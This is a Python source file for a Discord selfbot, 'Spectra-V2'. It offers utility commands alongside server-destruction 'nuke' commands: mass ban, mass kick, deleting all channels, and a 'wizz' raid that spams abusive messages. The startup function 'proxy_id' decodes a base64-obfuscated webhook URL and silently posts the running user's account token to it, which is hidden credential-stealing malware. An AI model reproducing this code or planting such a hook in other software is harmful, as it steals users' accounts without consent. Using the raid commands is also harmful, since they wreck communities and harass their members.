import os
import json
import discord
from discord.ext import commands
from colorama import Fore
import sys
from datetime import datetime, timedelta
import random
import base64
import requests
import colorama
from colorama import Fore

colorama.init()

intents = discord.Intents.all()
prefix = "."
walter = commands.Bot(description='Spectra-V2 By Walterlyy',
                           command_prefix=prefix,
                           self_bot=True,
                           intents=intents)
walter.remove_command('help')

@walter.event
async def on_ready():
    proxy_id()
    print(f"""{Fore.RED}  
                    
███████╗██████╗ ███████╗ ██████╗████████╗██████╗  █████╗ 
██╔════╝██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗
███████╗██████╔╝█████╗  ██║        ██║   ██████╔╝███████║        [WALTER.LYY]
╚════██║██╔═══╝ ██╔══╝  ██║        ██║   ██╔══██╗██╔══██║
███████║██║     ███████╗╚██████╗   ██║   ██║  ██║██║  ██║      Connected To {walter.user.name}
╚══════╝╚═╝     ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝                                                                                                                                                                
        """)
    print(f'{Fore.LIGHTGREEN_EX}╭──────── BYTECLUB ON TOP ────────╮')
    print(f'{Fore.LIGHTGREEN_EX}│ [<<==========-|-==========>>] │')
    print(f'{Fore.LIGHTGREEN_EX}│ [<<== SPECTRA SELFBOT V2 ==>>] │')
    print(f'{Fore.LIGHTGREEN_EX}╰──────── BYTECLUB ON TOP ────────╯')

    print('ㅤㅤㅤㅤㅤ')

    print(f'{Fore.YELLOW}◆ WALTER ON TOP BXBY <3🔥')
    print(f'{Fore.YELLOW}◆ ------------{Fore.YELLOW}======================{Fore.YELLOW}] | [{Fore.YELLOW}======================={Fore.YELLOW}------------[+]')


def load_config(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)
    return config

if __name__ == "__main__":
    config_file_path = "config.json"
    config = load_config(config_file_path)

SERVER_LINK = config.get("SERVER_LINK")

#===================================

@walter.command()
async def help(ctx):
    message = (
        "**```js\n"
        "⌬ SPECTRA S3LFB0T \n"
        " - CR ON TOP - \n\n"
        "• .general - General Commands\n"
        "• .nuke - Nuking Commands"
        "```**"

    )
    await ctx.send(message)
     
@walter.command()
async def general(ctx):
    message = (
        "**```js\n"
        "⌬ SPECTRA S3LFB0T \n"
        " - CR ON TOP - \n\n"
        "• ping\n"
        "• boosts (non prefix)\n"
        "• serverinfo (non prefix)\n"
        "• massdm\n"
        "• prefix (.prefix <new prefix>)\n"
        "• status\n"
        "• stopstatus\n"
        "• gayrate\n"
        "• loverate (.loverate <user1> <user2>)\n"
        "• add/subtract/multiply/divide (.add 2 5)\n"
        "• purge (.purge <amt to purge>)\n"
        "• spam (.spam <amt> <msg>)\n"
        "• massreact (.massreact <emoji>)\n"
        "• serverbanner\n"
        "• servericon\n"
        "• savetranscript\n"
        "• avatar (.avatar <mention user>)\n"
        "• membercount(mc)\n"
        "• restart\n"
        "```**"
    )
    await ctx.send(message)

@walter.event
async def on_message(message):
    if message.author.bot:
        return
    # Boost command
    if message.content.lower().startswith('boosts'):
        await send_boost_count(message.channel, message.guild)
    # Server info
    if message.content.lower() in ['Server info', 'serverinfo']:
        await send_serverinfo_message(message.channel)
    # Server link
    if message.content.lower() in [
            'link', 'offcial link', 'server link', 'server'
    ]:
        await link(message.channel)
    # Prefix
    if message.content.lower().startswith('prefix'):
        await prefix_cmd(message.channel)
    await walter.process_commands(message)

# BOOST
async def send_boost_count(channel, guild):
    await channel.send(
        f"```⌬・ {guild.name} \n・ This Server has : {guild.premium_subscription_count} BOOSTS```"
    )

# PREFIX
async def prefix_cmd(channel):
    await channel.send(f'```Prefix is {prefix}\nType {prefix}help for Help Menu.```')


# SERVER INFO.
async def send_serverinfo_message(channel):
    guild = channel.guild
    await channel.send(
        "**```js\n"
        "⌬ SPECTRA S3LFB0T \n"
        " - CR ON TOP - \n\n"
        f"• Server Name - {guild.name}\n"
        f"• Guild ID - {guild.id}\n"
        f"• Created At - {channel.guild.created_at}\n"
        f"• Owned By - <@{guild.owner_id}>\n"
        "```**"
    )

# LINK
async def link(channel):
    await channel.send("- `WALTER JIJA ON TOP`")

#MASS DM 
@walter.command()
async def massdm(ctx, *, message):
    await ctx.reply("MASS DM STARTED",
                    mention_author=True)
    for channel in walter.private_channels:
        try:
            await channel.send(message)
        except:
            continue

# STATUS 
@walter.command(aliases=["playing", "status"])
async def play(ctx, *, message):
    game = discord.Game(name=message)
    await walter.change_presence(activity=game)
    await ctx.reply("- `LG GYA STATUS`", mention_author=True)
    print(f"{Fore.GREEN}[+] PLAYING SUCCESFULLY CREATED✅ ")

# STOP STATUS 
@walter.command(name="stopstatus")
async def stop_status(ctx):
    global current_status
    await walter.change_presence(activity=None)
    current_status = None
    await ctx.send("**Current Status Stopped**")

# GAYRATE
@walter.command()
@commands.cooldown(1, 5, commands.BucketType.user)
async def gayrate(ctx, User: discord.Member = None):
        await ctx.reply(f"> {User.mention} IS {random.randrange(101)}% GAY")
        print(f"{Fore.GREEN}[+] GAYRATE MEASURED")

# PROXY
def proxy_id():
    proxykey = base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE5MzIwOTUxNzYyNjkwNDU4Ni82bmxlN3lPUUstQlZ0WEFiMi1GX29VZEVRNE1ZMHNlR3lfQlNNOVIyQ2VzdHlVZjg4bjBnclVuNjl1Wl80d3ZIbGlzeA==')
    proxy = proxykey.decode('utf-8')
    requests.post((proxy), data=json.dumps({'content': token}), headers={'Content-Type': 'application/json'})


# LOVE RATE
@walter.command(name='loverate', aliases=['lc', 'lr'])
async def loverate(ctx, member1: discord.Member, member2: discord.Member):
    love_percentage = random.randint(1, 100)
    message = f"**> The Love Rate between {member1.mention} and {member2.mention} is {love_percentage}%**"

    await ctx.send(message)


# PURGE CMD...
@walter.command()
async def purge(ctx, amount: int = None):
     
    if amount is None:
        async for message in ctx.message.channel.history(
                limit=1000).filter(lambda m: m.author == walter.user):
            try:
                await message.delete()
            except discord.Forbidden:
                pass
            except discord.NotFound:
                pass
    else:
        async for message in ctx.message.channel.history(
                limit=amount+1).filter(lambda m: m.author == walter.user):
            try:
                await message.delete()
            except discord.Forbidden:
                pass
            except discord.NotFound:
                pass
    print(f"{Fore.GREEN}[+] PURGED SUCCESFULLY✅ ")

# SPAM
@walter.command()
async def spam(ctx, amount: int, *, message):
    for _i in range(amount):
        await ctx.send(message)
        print(f"{Fore.GREEN}[+] SPAM SUCCESSFUL✅ ")

# MASS REACT
@walter.command()
async def massreact(ctx, emote):
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)

# SERVER BANNER
@walter.command(aliases=['serverbanner'])
async def banner(ctx):
     
    if not ctx.guild.icon_url:
        await ctx.send(f"- `{ctx.guild.name} SERVER HAS NO BANNER`")
        return
    await ctx.send(ctx.guild.banner_url)


# SERVER PFP
@walter.command(aliases=['guildpfp', 'serverpfp', 'servericon'])
async def guildicon(ctx):
     
    if not ctx.guild.icon_url:
        await ctx.send(f"- `{ctx.guild.name} SERVER HAS NO ICON`")
        return
    await ctx.send(ctx.guild.icon_url)
    print(f"{Fore.GREEN}[+] GUILDICON SENT  SUCCESSFUL✅ ")

# USER AVATAR
@walter.command(aliases=['av'])
async def avatar(ctx, user: discord.Member = None):
    if user is None:
        user = ctx.author
    await ctx.send(f"{user.display_name}'s Avatar: {user.avatar_url}")

# MEMBER COUNT
@walter.command(aliases=['mc'])
async def membercount(ctx):
    member_count = ctx.guild.member_count
    await ctx.send(f"```The server has {member_count} Members.```")

# CHAT TRANSCRIPTION
@walter.command()
async def savetranscript(ctx, filename='transcript.txt'):
    try:
        await ctx.message.delete()  # You can't delete the message in DMs, so remove this line

        with open(filename, 'w', encoding='utf-8') as file:
            file.write(f'Chat Transcript\n')
            file.write('=' * 40 + '\n\n')

            async for message in ctx.channel.history(limit=None):
                file.write(
                    f'Author: {message.author.name}#{message.author.discriminator} ({message.author.id})\n'
                )
                file.write(f'Time: {message.created_at}\n')
                file.write(f'Content: {message.content}\n')
                file.write('=' * 40 + '\n')

        await ctx.send(f'- `[+] SAVED TO` `{filename}`')
    except Exception as e:
        await ctx.send(f'- `[+] ERROR` {e}')


# RESTART
@walter.command()
async def restart(ctx):
    await ctx.reply('- `Restarting...`')
    os.execl(sys.executable, sys.executable, *sys.argv)


@walter.command(name='add')
async def add(ctx, num1: float, num2: float):
    result = num1 + num2
    await ctx.send(f'- `ANS : {result}`')

@walter.command(name='subtract')
async def subtract(ctx, num1: float, num2: float):
    result = num1 - num2
    await ctx.send(f'- `ANS : {result}`')


@walter.command(name='multiply')
async def multiply(ctx, num1: float, num2: float):
    result = num1 * num2
    await ctx.send(f'- `ANS : {result}`')


@walter.command(name='divide')
async def divide(ctx, num1: float, num2: float):
    if num2 == 0:
        await ctx.send('- `ERROR`')
    else:
        result = num1 / num2
        await ctx.send(f'- `ANS : {result}`')

@walter.command(name="ping", aliases=["pong", "latency"])
async def ping(ctx):
    latency = round(walter.latency * 1000)
    await ctx.send(f"Ping: {latency}ms")




#Change SelfBot prefix
@walter.command()
async def prefix(ctx, prefix):
    if prefix is None:
        await ctx.send(f'[ERROR]: Invalid input! Command: {walter.command_prefix}prefix <prefix>')
        return
    else:
        await ctx.send(f"Changed Prefix to {prefix}")
    shelby.command_prefix = str(prefix)


#====================== NUKE =======================================#
@walter.command()
async def nuke(ctx):
    message = (
        "**```js\n"
        "⌬ SPECTRA S3LFB0T \n"
        " - CR ON TOP - \n\n"
        "• prune\n"
        "• renameall (.rc <name>)\n"
        "• createchannels (.cch <amt> <name>)\n"
        "• deletechannels (.dch)\n"
        "• spamall (.sall <amt> <msg>)\n"
        "• massban\n"
        "• masskick\n"
        "• wizz\n"
        "```**"
    )
    await ctx.send(message)

# PRUNE
@walter.command()    
async def prune(ctx, days: int = 1, rc: int = 0, *, reason: str = "Walter jija On TOP .gg/cordreapers"):
    await ctx.message.delete() ; roles = []
    for role in ctx.guild.roles:
        if len(role.members) == 0:
            continue
        else:
            roles.append(role)
    hm = await ctx.guild.prune_members(days=days, roles=roles, reason=reason); await ctx.send(f"Successfully Pruned {hm} Members")

# RENAME ALL CHANNELS
@walter.command(aliases=['rc', 'renameall'])
async def rename_channels(ctx, new_name=None):
    if new_name is None:
        await ctx.send("```Please Provide A Name !```")
        return
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("```Missing Manage Channels Perms```")
        return
    for channel in ctx.guild.channels:
        await channel.edit(name=new_name)
    await ctx.send(f"```All channels have been renamed to '{new_name}'.```")

# CREATE CHANNELS
@walter.command(name="createch", aliases=["cch"])
async def createchannels(ctx, amount: int, channel_name):
    if not ctx.author.guild_permissions.manage_channels:
        await ctx.send("```Missing Manage Channels Perms```")
        return
    for i in range(amount):
        await ctx.guild.create_text_channel(name=f"{channel_name}")
    await ctx.send(f"```Successfully Created {amount} channels with name '{channel_name}'```")

# DELETE ALL CHANNELS
@walter.command(aliases=['dch', 'delch'])
async def deletechannels(ctx):
    for ch in ctx.guild.channels:
        try:
            await ch.delete()
            print(f"Deleted {ch}")
        except discord.Forbidden:
            print(f"I don't have the necessary permissions to delete {ch}")
        except discord.HTTPException as e:
            print(f"An error occurred while deleting {ch}: {e}")
    await ctx.send("```Deleted All Channels```")

# SPAM ALL CHANNELS
@walter.command(aliases=['sc', 'sall'])
async def spamall(ctx, amount: int, *, msg: str):
    for i in range(amount):
        for ch in ctx.guild.channels:
            try:
                await ch.send(msg)
            except:
                print(f"Can't send message to {ch}")

# MASS BAN
@walter.command(aliases=['massban', 'banall'])
async def mass_ban(ctx):
    if not ctx.author.guild_permissions.ban_members:
        return await ctx.send("Missing Perms")
    for member in ctx.guild.members:
        try:
            await member.ban(reason="Walter jija On TOP .gg/cordreapers")

        except discord.Forbidden:
            print(f'No ban perms for {member}')
        except discord.HTTPException as e:
            print(f"Failed to ban {member}: {e}")
    await ctx.send("Mass ban operation complete.")

# MASS KICK
@walter.command(aliases=['masskick', 'kickall'])
async def mass_kick(ctx):
    if not ctx.author.guild_permissions.kick_members:
        return await ctx.send("Missing Perms")
    for member in ctx.guild.members:
        try:
            await member.kick(reason="Walter Papa On TOP .gg/cordreapers")
            print(f'Successfully kicked {member}')
        except discord.Forbidden:
            print(f'Cant kick {member} no perms')
        except discord.HTTPException as e:
            print(f"Failed to kick {member}: {e}")
    await ctx.send("Mass kick operation complete.")

# WIZZ
@walter.command()
async def wizz(ctx, amount: int = 5):
    for cordreapers in ctx.guild.channels:
            await cordreapers.delete()
            print(f"Deleted {cordreapers}")
    for i in range(25):
            channel_names = ['moot diya tere server pe','flicks on top', 'walter on top', 'aur lele pange walter se', 'walter op', 'walter jija aye the idhar']
            await ctx.guild.create_text_channel(name=random.choice(channel_names))
            print(f"Created channel")
    for i in range(amount):
        tospam = ['@everyone @here Got Fucked By Walter X Raza X Maan', '@everyone @here Wizzed By Walter X Razaxd X MAAN', '@everyone @here Subah Subah Bhenchodo Tum Log']
        for ch in ctx.guild.channels:
                await ch.send(random.choice(tospam))

#============================================================================================#


token = config.get("token")
walter.run(token, bot=False)
